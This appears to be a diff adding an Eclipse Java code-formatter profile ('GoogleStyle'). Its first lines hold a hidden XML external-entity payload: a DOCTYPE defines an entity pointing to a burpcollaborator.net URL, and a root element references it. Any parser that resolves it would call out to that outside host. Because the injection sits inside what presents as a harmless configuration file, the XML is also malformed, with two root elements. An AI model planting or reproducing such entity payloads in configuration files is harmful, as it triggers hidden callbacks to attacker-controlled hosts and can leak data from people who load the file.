@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://sea44pnktp5h3hbpiq5iqemq3h98xx.burpcollaborator.net/xxx'>]>
+<root>&test;</root>
+<profiles version="13">
+<profile kind="CodeFormatterProfile" name="GoogleStyle" version="13">
+<setting id="org.eclipse.jdt.core.formatter.comment.insert_new_line_before_root_tags" value="insert"/>
+</profile>
+</profiles>
